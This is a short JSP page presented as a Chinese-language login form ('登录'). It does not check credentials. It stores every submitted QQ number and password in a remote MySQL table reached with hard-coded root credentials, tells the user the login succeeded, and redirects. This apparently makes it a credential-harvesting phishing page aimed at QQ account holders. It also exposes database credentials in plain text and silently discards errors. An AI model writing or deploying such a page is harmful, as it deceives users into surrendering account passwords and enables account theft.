<%@ page import="java.sql.Connection" %>
<%@ page import="java.sql.DriverManager" %>
<%@ page import="java.sql.PreparedStatement" %>
<%@ page import="java.sql.SQLException" %><%--
  Created by IntelliJ IDEA.
  User: ASUS
  Date: 2017/3/10
  Time: 21:03
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>登录</title>
</head>
<body>

<%!
    private final String DATABASEDRIVE = "com.mysql.jdbc.Driver";
    private final String URL = "jdbc:mysql://123.207.18.179:3306/qq";
    private final String USERNAME = "root";
    private final String PASSWORD = "mypasswd";
    String qq = "";
    String password = "";
%>

<%
    qq = request.getParameter("qq");
    password = request.getParameter("password");

    try {
        Class.forName(DATABASEDRIVE);
        Connection connection = null;
        try {
            connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);
            String sql = "INSERT INTO t_qq (qq, password) VALUES (?,?);";
            PreparedStatement statement = connection.prepareStatement(sql);
            statement.setString(1, qq);
            statement.setString(2, password);
            statement.executeUpdate();
        } catch (SQLException e) {

        }
    } catch (ClassNotFoundException e) {

    }
    out.print("登录成功，稍等");
    response.setHeader("refresh", "1;URL=context.html");
%>

</body>
</html>
